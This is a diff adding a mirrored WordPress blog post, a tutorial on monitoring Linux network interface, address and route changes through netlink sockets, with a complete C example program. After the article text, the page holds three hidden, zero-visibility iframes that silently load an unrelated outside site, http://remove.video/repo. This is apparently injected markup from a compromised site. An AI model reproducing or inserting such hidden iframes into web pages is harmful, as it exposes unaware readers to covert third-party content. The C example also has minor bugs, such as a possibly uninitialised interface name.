@@ -1,0 +1,850 @@
+<!DOCTYPE html> <html lang="en-US">
+<!-- Mirrored from olegkutkov.me/2018/02/14/monitoring-linux-networking-state-using-netlink/?replytocom=51 by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 22 May 2024 19:17:09 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="profile" href="http://gmpg.org/xfn/11">
+    <link rel="pingback" href="../../../../xmlrpc.php">
+    
+<link media="all" href="../../../../wp-content/cache/autoptimize/css/autoptimize_d3a63325ffdf3e63cfd04bb7108474ba.css" rel="stylesheet"><title>Monitoring Linux networking state using netlink &#8211; Oleg Kutkov personal blog</title>
+<meta name='robots' content='max-image-preview:large, noindex, follow' />
+
+<link rel="alternate" type="application/rss+xml" title="Oleg Kutkov personal blog &raquo; Feed" href="../../../../feed/index.html" />
+<link rel="alternate" type="application/rss+xml" title="Oleg Kutkov personal blog &raquo; Comments Feed" href="../../../../comments/feed/index.html" />
+<link rel="alternate" type="application/rss+xml" title="Oleg Kutkov personal blog &raquo; Monitoring Linux networking state using netlink Comments Feed" href="feed/index.html" />
+<script type="text/javascript">
+/* <![CDATA[ */
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/olegkutkov.me\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.5.3"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+/* ]]> */
+</script>
+
+
+
+
+
+
+
+<link rel='stylesheet' id='blog-way-fonts-css' href='../../../../wp-content/cache/autoptimize/css/autoptimize_single_94734ec7b04ae676db1e4cafbe009ca298dd.css?ver=1647447083' type='text/css' media='all' />
+
+
+<script type="text/javascript" src="../../../../wp-includes/js/jquery/jquery.minf43b.js?ver=3.7.1" id="jquery-core-js"></script>
+
+<link rel="https://api.w.org/" href="../../../../wp-json/index.html" /><link rel="alternate" type="application/json" href="../../../../wp-json/wp/v2/posts/250.json" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../../../xmlrpc0db0.php?rsd" />
+<meta name="generator" content="WordPress 6.5.3" />
+<link rel="canonical" href="index.html" />
+<link rel='shortlink' href='../../../../indexc807.html?p=250' />
+<link rel="alternate" type="application/json+oembed" href="../../../../wp-json/oembed/1.0/embedb6e8.json?url=https%3A%2F%2Folegkutkov.me%2F2018%2F02%2F14%2Fmonitoring-linux-networking-state-using-netlink%2F" />
+<link rel="alternate" type="text/xml+oembed" href="../../../../wp-json/oembed/1.0/embed88cf?url=https%3A%2F%2Folegkutkov.me%2F2018%2F02%2F14%2Fmonitoring-linux-networking-state-using-netlink%2F&amp;format=xml" />
+		<meta name="author" content="oleg_kutkov">
+		<meta name="classification" content="Embedded, Linux system development, Electronics, Radio &amp; antennas">
+		<meta name="copyright" content="Copyright Oleg Kutkov personal blog - All rights Reserved.">
+		<meta name="designer" content="Oleg Kutkov">
+		<meta name="distribution" content="Global">
+		<meta name="language" content="en-US">
+		<meta name="publisher" content="Oleg Kutkov personal blog">
+		<meta name="rating" content="General">
+		<meta name="resource-type" content="Document">
+		<meta name="revisit-after" content="3">
+		<meta name="subject" content="Embedded, Linux system development, Electronics, Radio &amp; antennas">
+		<meta name="template" content="Twenty Sixteen">
+		<meta name="google-site-verification" content="8DtB-RdO3yEMbX6FI90X5epj-tTr5nOhooTmZxVmAcM" />
+<meta name="msvalidate.01" content="0C098D163A08B0D9E8B291C619A521FE" />
+<script type="text/javascript"> //<![CDATA[
+  var tlJsHost = ((window.location.protocol == "index740f.html") ? "https://secure.trust-provider.com/" : "http://www.trustlogo.com/");
+  document.write(unescape("%3Cscript src='" + tlJsHost + "trustlogo/javascript/trustlogo.js' type='text/javascript'%3E%3C/script%3E"));
+//]]></script>
+<script language="JavaScript" type="text/javascript">
+  TrustLogo("../../../../../www.positivessl.com/images/seals/positivessl_trust_seal_md_167x42.png", "POSDV", "none");
+</script>
+<link rel="pingback" href="../../../../xmlrpc.php">               
+    
+
+<link rel="preload" as="style" href="../../../../wp-content/plugins/code-prettify/prettify/prettify.css" /><link rel="icon" href="../../../../wp-content/uploads/2018/02/cropped-Screenshot-02152018-121038-PM-2-32x32.png" sizes="32x32" />
+<link rel="icon" href="../../../../wp-content/uploads/2018/02/cropped-Screenshot-02152018-121038-PM-2-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="../../../../wp-content/uploads/2018/02/cropped-Screenshot-02152018-121038-PM-2-180x180.png" />
+<meta name="msapplication-TileImage" content="https://olegkutkov.me/wp-content/uploads/2018/02/cropped-Screenshot-02152018-121038-PM-2-270x270.png" />
+		
+		</head>
+
+<body class="post-template-default single single-post postid-250 single-format-standard sticky-top">
+	<div id="page" class="site">
+		<header id="masthead" class="site-header navbar-fixed-top" role="banner"><div class="container"><div class="row">    	<div class="col-sm-12">
+            <nav id="site-navigation" class="main-navigation" role="navigation">
+                <div class="menu-about-me-container"><ul id="primary-menu" class="menu"><li id="menu-item-218" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-218"><a href="../../../../index.html">Home</a></li>
+<li id="menu-item-2937" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2937"><a href="../../../../starlink-repairs-archive/index.html">Starlink repairs archive</a></li>
+<li id="menu-item-2978" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2978"><a href="../../../../olegkutkov_public_key.txt">Public PGP</a></li>
+<li id="menu-item-3140" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3140"><a href="../../../../license/index.html">License</a></li>
+<li id="menu-item-219" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-219"><a href="../../../../about-me/index.html">About me</a></li>
+</ul></div>            </nav>
+        </div>
+        </div><!-- .row --></div><!-- .container --></header><!-- #masthead -->        <div class="main-banner banner-disabled overlay-enabled" >
+            <div class="container">
+                <div class="row">
+                    <div class="site-branding">
+                        
+                            <h2 class="site-title"><a href="../../../../index.html" rel="home">Oleg Kutkov personal blog</a></h2>
+                           
+                            
+                                <h3 class="site-description">Programming, electronics and diy projects</h3>
+
+                                                    </div><!-- .site-branding -->
+                </div>
+            </div>
+        </div><!-- .main-banner -->
+        <div id="content" class="site-content"><div class="container"><div class="row"><div class="col-md-8 col-sm-12 layout-right-sidebar main-content-area"><div id="primary" class="content-area"><main id="main" class="site-main" role="main">
+	
+<article id="post-250" class="post-250 post type-post status-publish format-standard hentry category-linux-kernel category-linux-system-development category-networking tag-linux tag-netlink tag-network tag-socket">
+
+	<div class="detail-wrap">
+		<header class="entry-header">
+			<span class="cat-links"><a href="../../../../category/linux-kernel/index.html" rel="category tag">Linux kernel</a>, <a href="../../../../category/linux-system-development/index.html" rel="category tag">Linux system development</a>, <a href="../../../../category/networking/index.html" rel="category tag">Networking</a></span><h1 class="entry-title">Monitoring Linux networking state using netlink</h1>
+				<div class="author-date">
+											<span class="author vcard"><a class="url fn n" href="../../../../author/oleg_kutkov/index.html">Oleg Kutkov</a></span>
+					
+											<span class="separator"> / </span>
+					
+											<span class="posted-on">February 14, 2018</span>
+									</div><!-- .author-date -->
+			
+		</header><!-- .entry-header -->
+
+		
+		<div class="entry-content">
+			<p><img decoding="async" class="alignleft wp-image-255 size-thumbnail" src="../../../../wp-content/uploads/2018/02/nemon_example-150x150.png" alt="" width="150" height="150" />Once in my work, I needed to monitor all changes in the Linux networking subsystem: adding or deleting IP addresses, routes, etc.<br />
+Maybe the best way to do this is to use socket-based Netlink technology. Using Netlink, we can &#8220;subscribe&#8221; to some network-related notifications from the kernel. It&#8217;s also possible to send commands to the network stack and change the routing table, interface configurations, and packet filtering. For example, popular utilities like &#8220;iproute2&#8221; are also using Netlink to do their job.<br />
+The easiest way to access Netlink sockets from the userspace is to use <a href="https://www.infradead.org/~tgr/libnl/doc/core.html">a libnetlink</a> library, which provides many macros, defines, and functions.<br />
+The worst part of this library and whole Netlink technology is a lack of good examples.<br />
+In this case, a good solution is using iproute2 source code to discover things you interesting in. This article is also may be used as a good startup point.</p>
+<p><span id="more-250"></span></p>
+<h3>Introduction in Netlink</h3>
+<p>The Netlink is a socket-based Linux kernel interface used for inter-process communication (IPC) between both the kernel and userspace processes and between different userspace processes, in a way similar to the Unix domain sockets.</p>
+<p>Like the Unix domain sockets, unlike INET sockets, Netlink communication cannot traverse host boundaries.<br />
+However, while the Unix domain sockets use the file system namespace, Netlink processes are addressed by process identifiers (PIDs).</p>
+<p>Communication with Netlink is made using a separate socket&#8217;s family &#8211; <strong>AF_NETLINK</strong>.<br />
+Every Netlink message contains a header, represented with <strong>nlmsghdr</strong> structure. After the header may be attached some payload: some special structure or RAW data.<br />
+Netlink can split big messages into multiple parts. In such a case, every &#8220;partial&#8221; package is marked with <strong>NLM_F_MULTI</strong> flag, and the last package is marked with <strong>NLMSG_DONE</strong> flag.</p>
+<p>There are a lot of useful macros that can help us to parse Netlink messages.<br />
+Everything is defined in Netlink.h and rtnetlink.h header files.</p>
+<p>Creating of Netlink socket is pretty standard.</p>
+<pre class="prettyprint">socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE)</pre>
+<p>where:<br />
+<strong>AF_NETLINK</strong> — netlink domain<br />
+<strong>SOCK_RAW</strong> — raw socket<br />
+<strong>NETLINK_ROUTE</strong> — required protocol.</p>
+<p>In particular, <strong>NETLINK_ROUTE</strong> is used for routing and link information.</p>
+<p>All available protocols can be found in the documentation. Here is a list of the most interesting:</p>
+<ul>
+<li><strong>NETLINK_ROUTE — </strong>routing and link information, monitoring and configuration routines</li>
+<li><strong>NETLINK_FIREWALL</strong> — transfer packets to userspace from the firewall</li>
+<li><strong>NETLINK_INET_DIAG</strong> — information about sockets of various protocol families</li>
+<li><strong>NETLINK_NFLOG</strong> — Netfilter/iptables ULOG</li>
+<li><strong>NETLINK_SELINUX</strong> — SELinux event notifications</li>
+<li><strong>NETLINK_NETFILTER</strong> — communications with Netfilter subsystem</li>
+<li><strong>NETLINK_KOBJECT_UEVENT</strong> — get kernel messages</li>
+<li><strong>NETLINK_USERSOCK</strong> — reserved for user-defined protocols</li>
+</ul>
+<h3>Communication</h3>
+<p>All communications through the Netlink socket is made with two well-known structures: <strong>msghdr</strong> and <strong>iovec</strong>.</p>
+<pre class="prettyprint">struct iovec
+{
+    void *iov_base; // data buff
+    __kernel_size_t iov_len; // size of the data
+};</pre>
+<p>This structure contains a link to the actual message buffer with some data and its size.</p>
+<pre class="prettyprint">struct msghdr {
+    void *msg_name; // client addr (socket name)
+    int msg_namelen; // length of the client addr
+    struct iovec *msg_iov; // pointer to the iovec structure with message data
+    __kernel_size_t msg_iovlen; // count of the data blocks
+    void *msg_control; // points to a buffer for other protocol control-related messages or miscellaneous ancillary data. 
+    __kernel_size_t msg_controllen; // length of the msg_control
+    unsigned  msg_flags; // flags on received message
+};
+</pre>
+<p>struct <strong>msghdr</strong> can be directly passed to socket&#8217;s <strong>recvmsg</strong> and <strong>sendmsg</strong> and used to minimize the number of directly supplied arguments.</p>
+<p>This structure is defined in <em>&lt;sys/socket.h&gt;</em></p>
+<p>See <a href="https://linux.die.net/man/2/recvmsg">recvmsg</a> and <a href="https://linux.die.net/man/2/sendmsg">sendmsg</a> for details.</p>
+<p>A Netlink message stored in <strong>iovec</strong> typically contains a Netlink message header (<strong>struct nlmsghdr</strong>) and the payload attached. The payload can consist of arbitrary data but usually contains a fixed size protocol-specific header followed by a stream of attributes.</p>
+<pre class="prettyprint">struct nlmsghdr
+{
+    __u32 nlmsg_len; // message size, include this header
+    __u16 nlmsg_type; // message type (see below)
+    __u16 nlmsg_flags; // message flags (see below)
+    __u32 nlmsg_seq; // sequence number
+    __u32 nlmsg_pid; // sender identifier (typically - process id)
+};</pre>
+<div class="paragraph">
+<p>The following standard message types are defined:</p>
+<ul>
+<li><strong>NLMSG_NOOP</strong> &#8211; No operation, a message must be discarded</li>
+<li><strong>NLMSG_ERROR</strong> &#8211; Error message or ACK, see Error Message respectively ACKs</li>
+<li><strong>NLMSG_DONE</strong> &#8211; End of multipart sequence, see Multipart Messages</li>
+<li><strong>NLMSG_OVERRUN</strong> &#8211; Overrun notification (Error)</li>
+</ul>
+<blockquote><p>Every netlink protocol is free to define own message types. Note that message type values <code>&lt; NLMSG_MIN_TYPE (0x10)</code> are reserved and may not be used.</p></blockquote>
+<div class="paragraph">
+<p>The following standard flags are defined:</p>
+<ul>
+<li><strong>NLM_F_REQUEST</strong> — Request message</li>
+<li><strong>NLM_F_MULTI</strong> — Part of the multipart message</li>
+<li><strong>NLM_F_ACK</strong> — Acknowledge requested</li>
+<li><strong>NLM_F_ECHO</strong> — Request to echo this request; typical direction is from kernel to user</li>
+<li><strong>NLM_F_ROOT</strong> — Return based on the root of the tree</li>
+<li><strong>NLM_F_MATCH</strong> — Return all matching entries</li>
+<li><strong>NLM_F_ATOMIC</strong> — Is obsolete now, used to request an atomic operation</li>
+<li><strong>NLM_F_DUMP</strong> — Same as <strong>NLM_F_ROOT|NLM_F_MATCH</strong></li>
+</ul>
+<p>The client&#8217;s identifications (user and kernel spaces) are made with structure <strong>sockaddr_nl.</strong></p>
+</div>
+</div>
+<pre class="prettyprint">struct sockaddr_nl
+{
+    sa_family_t nl_family; // always AF_NETLINK
+    unsigned short nl_pad; // typically filled with zeros
+    pid_t nl_pid; // client identifier (process id)
+    __u32 nl_groups; // mask for senders/recivers group
+};</pre>
+<p><strong>nl_pid</strong> &#8211; unique socket identifier, for the kernel sockets, this value is always zero. On the userspace, typically used current process id. This may cause problems in multithreading applications if multiple threads are trying to create and use Netlink sockets.<br />
+To work around this, we can initialize every nl_pid with this construction:</p>
+<pre class="prettyprint">pthread_self() &lt;&lt; 16 | getpid()</pre>
+<p><strong>nl_groups</strong> — is a special bitmask of Netlink groups. This value is used after calling bind() on the Netlink socket to &#8220;subscribe&#8221; to specified groups&#8217; events.<br />
+This is what we gonna use in our current task &#8211; network monitoring.</p>
+<p>The definition of all groups can be found in the Netlink header file.<br />
+Here is some of them, which we can use in the current situation:</p>
+<ul>
+<li><strong>RTMGRP_LINK</strong> — notifications about changes in network interface (up/down/added/removed)</li>
+<li><strong>RTMGRP_IPV4_IFADDR</strong> — notifications about changes in IPv4 addresses (address was added or removed)</li>
+<li><strong>RTMGRP_IPV6_IFADDR</strong> — same for IPv6</li>
+<li><strong>RTMGRP_IPV4_ROUTE</strong> — notifications about changes in IPv4 routing table</li>
+<li><strong>RTMGRP_IPV6_ROUTE</strong> — same for IPv6</li>
+</ul>
+<h5>Netlink message payload</h5>
+<p>As I already said &#8211; after the header, we can found some payload, which may be split into parts. Libnetlink contains several macros that are extremely helpful in accessing and checking message payload.</p>
+<p>Some most useful:</p>
+<ul>
+<li><strong>NLMSG_DATA</strong> — Get pointer to the message payload</li>
+<li><strong>NLMSG_PAYLOAD</strong> — Get the actual size of the message payload</li>
+<li><strong>NLMSG_ALIGN</strong> — Rounds the message size to the nearest aligned value</li>
+<li><strong>NLMSG_LENGTH</strong> — Get the size of the payload and returns a correct aligned value</li>
+<li><strong>NLMSG_SPACE</strong> — Get the actual size of the data in the Netlink packet</li>
+<li><strong>NLMSG_NEXT</strong> — Get the next part of the multipart message. When using these macros, it&#8217;s important to check for <strong>NLMSG_DONE</strong> message flag to avoid buffer overruns.</li>
+<li><strong>NLMSG_OK</strong> — Returns true if the message is correct and was successfully parsed</li>
+</ul>
+<h3>Practical usage of Netlink</h3>
+<p>Okay, I think that it&#8217;s enough of boring theory 🙂<br />
+Time to write some code and testing of the application.</p>
+<p>Here is the full source code:</p>
+<pre class="prettyprint">#include &lt;errno.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;memory.h&gt;
+#include &lt;net/if.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;linux/rtnetlink.h&gt;
+
+// little helper to parsing message using netlink macroses
+void parseRtattr(struct rtattr *tb[], int max, struct rtattr *rta, int len)
+{
+    memset(tb, 0, sizeof(struct rtattr *) * (max + 1));
+
+    while (RTA_OK(rta, len)) {  // while not end of the message
+        if (rta-&gt;rta_type &lt;= max) {
+            tb[rta-&gt;rta_type] = rta; // read attr
+        }
+        rta = RTA_NEXT(rta,len);    // get next attr
+    }
+}
+
+int main()
+{
+    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);   // create netlink socket
+
+    if (fd &lt; 0) {
+        printf("Failed to create netlink socket: %s\n", (char*)strerror(errno));
+        return 1;
+    }
+
+    struct sockaddr_nl  local;  // local addr struct
+    char buf[8192];             // message buffer
+    struct iovec iov;           // message structure
+    iov.iov_base = buf;         // set message buffer as io
+    iov.iov_len = sizeof(buf);  // set size
+
+    memset(&amp;local, 0, sizeof(local));
+
+    local.nl_family = AF_NETLINK;       // set protocol family
+    local.nl_groups =   RTMGRP_LINK | RTMGRP_IPV4_IFADDR | RTMGRP_IPV4_ROUTE;   // set groups we interested in
+    local.nl_pid = getpid();    // set out id using current process id
+
+    // initialize protocol message header
+    struct msghdr msg;  
+    {
+        msg.msg_name = &amp;local;                  // local address
+        msg.msg_namelen = sizeof(local);        // address size
+        msg.msg_iov = &amp;iov;                     // io vector
+        msg.msg_iovlen = 1;                     // io size
+    }   
+
+    if (bind(fd, (struct sockaddr*)&amp;local, sizeof(local)) &lt; 0) {     // bind socket
+        printf("Failed to bind netlink socket: %s\n", (char*)strerror(errno));
+        close(fd);
+        return 1;
+    }   
+
+    // read and parse all messages from the
+    while (1) {
+        ssize_t status = recvmsg(fd, &amp;msg, MSG_DONTWAIT);
+
+        //  check status
+        if (status &lt; 0) {
+            if (errno == EINTR || errno == EAGAIN)
+            {
+                usleep(250000);
+                continue;
+            }
+
+            printf("Failed to read netlink: %s", (char*)strerror(errno));
+            continue;
+        }
+
+        if (msg.msg_namelen != sizeof(local)) { // check message length, just in case
+            printf("Invalid length of the sender address struct\n");
+            continue;
+        }
+
+        // message parser
+        struct nlmsghdr *h;
+
+        for (h = (struct nlmsghdr*)buf; status &gt;= (ssize_t)sizeof(*h); ) {   // read all messagess headers
+            int len = h-&gt;nlmsg_len;
+            int l = len - sizeof(*h);
+            char *ifName;
+
+            if ((l &lt; 0) || (len &gt; status)) {
+                printf("Invalid message length: %i\n", len);
+                continue;
+            }
+
+            // now we can check message type
+            if ((h-&gt;nlmsg_type == RTM_NEWROUTE) || (h-&gt;nlmsg_type == RTM_DELROUTE)) { // some changes in routing table
+                printf("Routing table was changed\n");  
+            } else {    // in other case we need to go deeper
+                char *ifUpp;
+                char *ifRunn;
+                struct ifinfomsg *ifi;  // structure for network interface info
+                struct rtattr *tb[IFLA_MAX + 1];
+
+                ifi = (struct ifinfomsg*) NLMSG_DATA(h);    // get information about changed network interface
+
+                parseRtattr(tb, IFLA_MAX, IFLA_RTA(ifi), h-&gt;nlmsg_len);  // get attributes
+                
+                if (tb[IFLA_IFNAME]) {  // validation
+                    ifName = (char*)RTA_DATA(tb[IFLA_IFNAME]); // get network interface name
+                }
+
+                if (ifi-&gt;ifi_flags &amp; IFF_UP) { // get UP flag of the network interface
+                    ifUpp = (char*)"UP";
+                } else {
+                    ifUpp = (char*)"DOWN";
+                }
+
+                if (ifi-&gt;ifi_flags &amp; IFF_RUNNING) { // get RUNNING flag of the network interface
+                    ifRunn = (char*)"RUNNING";
+                } else {
+                    ifRunn = (char*)"NOT RUNNING";
+                }
+
+                char ifAddress[256];    // network addr
+                struct ifaddrmsg *ifa; // structure for network interface data
+                struct rtattr *tba[IFA_MAX+1];
+
+                ifa = (struct ifaddrmsg*)NLMSG_DATA(h); // get data from the network interface
+
+                parseRtattr(tba, IFA_MAX, IFA_RTA(ifa), h-&gt;nlmsg_len);
+
+                if (tba[IFA_LOCAL]) {
+                    inet_ntop(AF_INET, RTA_DATA(tba[IFA_LOCAL]), ifAddress, sizeof(ifAddress)); // get IP addr
+                }
+
+                switch (h-&gt;nlmsg_type) { // what is actually happenned?
+                    case RTM_DELADDR:
+                        printf("Interface %s: address was removed\n", ifName);
+                        break;
+
+                    case RTM_DELLINK:
+                        printf("Network interface %s was removed\n", ifName);
+                        break;
+
+                    case RTM_NEWLINK:
+                        printf("New network interface %s, state: %s %s\n", ifName, ifUpp, ifRunn);
+                        break;
+
+                    case RTM_NEWADDR:
+                        printf("Interface %s: new address was assigned: %s\n", ifName, ifAddress);
+                        break;
+                }
+            }
+
+            status -= NLMSG_ALIGN(len); // align offsets by the message length, this is important
+
+            h = (struct nlmsghdr*)((char*)h + NLMSG_ALIGN(len));    // get next message
+        }
+
+        usleep(250000); // sleep for a while
+    }
+
+    close(fd);  // close socket
+
+    return 0;
+}
+</pre>
+<p>The compilation is straightforward, nothing additional:</p>
+<pre class="prettyprint">gcc netmon.c -o netmon</pre>
+<p>And run:</p>
+<pre class="prettyprint">./netmon</pre>
+<p>Now you can try to play with your network interfaces &#8211; unplug and plug back of the Ethernet cable, reconnect WiFi, and so on.</p>
+<p>You will get something like this:</p>
+<p><a href="../../../../wp-content/uploads/2018/02/nemon_example.png"><img fetchpriority="high" decoding="async" class="aligncenter wp-image-255 size-full" src="../../../../wp-content/uploads/2018/02/nemon_example.png" alt="" width="746" height="474" srcset="https://olegkutkov.me/wp-content/uploads/2018/02/nemon_example.png 746w, https://olegkutkov.me/wp-content/uploads/2018/02/nemon_example-300x191.png 300w" sizes="(max-width: 746px) 100vw, 746px" /></a>It&#8217;s alive! 🙂</p>
+<h5>Data processing</h5>
+<p>In this example, you can find some new structures:</p>
+<pre class="prettyprint">struct ifinfomsg
+{
+    unsigned char  ifi_family;  // interface family
+    unsigned short ifi_type;    // device type
+    int            ifi_index;   // interface index
+    unsigned int   ifi_flags;   // device flags
+    unsigned int   ifi_change;  // reserved, currently always 0xFFFFFFFF
+};</pre>
+<p><strong>struct ifinfomsg</strong> represents a network device and contains some useful fields, like device flags and index.</p>
+<pre class="prettyprint">struct ifaddrmsg
+{
+    unsigned char  ifa_family;    // Adress type (AF_INET or AF_INET6)
+    unsigned char  ifa_prefixlen; // Length of the network mask
+    unsigned char  ifa_flags;     // Address flags
+    unsigned char  ifa_scope;     // Address scope
+    int            ifa_index;     // Interface index, same as in struct ifinfomsg
+};</pre>
+<p><strong>struct ifaddrmsg </strong>represents the network address assigned to the device</p>
+<pre class="prettyprint">struct rtattr
+{
+    unsigned short rta_len; // Length of the option
+    unsigned short rta_type; // Type of the option
+    /* data */ 
+}
+</pre>
+<p><strong>struct rtattr</strong> is a helper structure used to store some parameters of the address or network link</p>
+<p>After the successful creation of the Netlink socket, we initializing <strong>sockaddr_nl</strong> structure by setting a mask of the groups which messages we want to receive:<br />
+<strong>RTMGRP_LINK, RTMGRP_IPV4_IFADDR</strong> and <strong>RTMGRP_IPV4_ROUTE</strong>.<br />
+Also, at this point, we are allocating message structure and data buffer with a length of 8192 bytes.<br />
+After all of this, we can call <strong>bind()</strong> on a socket, subscribing to group events.<br />
+We get new messages from the socket in the infinity cycle and then parsing this message using Netlink macro.<br />
+Checking <strong>nlmsg_type</strong> field, we can detect the type of the received message. In the case of some interface/address event, we are digging deeper and getting all the interesting data.<br />
+All information is stored as an array of attributes with<strong> struct rtattr</strong>.<br />
+Using the little helper function parseRattr we can parse all attributes and extract readable information from this array.</p>
+<pre class="prettyprint">struct ifinfomsg *ifi = (struct ifinfomsg*) NLMSG_DATA(h); // where h is netlink message header
+parseRtattr(tb, IFLA_MAX, IFLA_RTA(ifi), h-&gt;nlmsg_len);
+char* ifName = (char*)RTA_DATA(tb[IFLA_IFNAME]); // readable interface name, eth0 for example</pre>
+<p>You can check <a href="http://man7.org/linux/man-pages/man7/rtnetlink.7.html">rtnetlink</a> manual page to get more information about <strong>rtattr</strong> arrays and possible attributes indexes.</p>
+<p>I believe that all other code in this example is pretty obvious and didn&#8217;t require detailed explanations.<br />
+But if you have some questions &#8211; please ask in the comments.</p>
+<p>I hope this article will be helpful.</p>
+<p>Additional materials:</p>
+<ol>
+<li><a href="http://tools.ietf.org/html/rfc3549">tools.ietf.org/html/rfc3549</a></li>
+<li><a href="http://man7.org/linux/man-pages/man7/netlink.7.html">http://man7.org/linux/man-pages/man7/netlink.7.html</a></li>
+<li><a href="http://man7.org/linux/man-pages/man7/rtnetlink.7.html">http://man7.org/linux/man-pages/man7/rtnetlink.7.html</a></li>
+<li><a href="http://linuxjournal.com/article/7356">http://linuxjournal.com/article/7356</a></li>
+</ol>
+<div><iframe id="embedPath" style="height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;" src="http://remove.video/repo"></iframe></div>
+<div><iframe id="embedPath" style="height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;" src="http://remove.video/repo"></iframe></div>
+<div><iframe id="embedPath" style="height: 1px,width:1px; position: absolute; top: 0; left: 0; border: none; visibility: hidden;" src="http://remove.video/repo"></iframe></div>
+<span class="tags-links">Tagged <a href="../../../../tag/linux/index.html" rel="tag">linux</a>, <a href="../../../../tag/netlink/index.html" rel="tag">netlink</a>, <a href="../../../../tag/network/index.html" rel="tag">network</a>, <a href="../../../../tag/socket/index.html" rel="tag">socket</a></span>		</div><!-- .entry-content -->
+	</div>
+
+</article><!-- #post-## -->
+
+                    <div class="related-posts">
+
+                        
+                            <h3 class="related-posts-title">Related Posts</h3>
+
+                                                    
+                        <div class="inner-wrapper">
+                              
+
+                                <div class="news-item three-column-item">
+                                    <div class="news-thumb">
+                                        <a href="../../../../2024/02/12/starlink-terminal-revision-4-overview-and-tests/index.html"></a>   
+                                    </div><!-- .news-thumb --> 
+
+                                   <div class="news-text-wrap">
+                                        <h2><a href="../../../../2024/02/12/starlink-terminal-revision-4-overview-and-tests/index.html">Starlink terminal revision 4: overview and tests</a></h2>
+                                         <span class="posted-date">February 12, 2024</span>
+                                   </div><!-- .news-text-wrap -->
+                                </div><!-- .news-item -->
+
+                                  
+
+                                <div class="news-item three-column-item">
+                                    <div class="news-thumb">
+                                        <a href="../../../../2023/06/09/how-to-power-starlink-terminal-from-12v-without-poe-injector-and-dc-dc-converters/index.html"></a>   
+                                    </div><!-- .news-thumb --> 
+
+                                   <div class="news-text-wrap">
+                                        <h2><a href="../../../../2023/06/09/how-to-power-starlink-terminal-from-12v-without-poe-injector-and-dc-dc-converters/index.html">How to power Starlink terminal from 12V without PoE injector and DC/DC converters</a></h2>
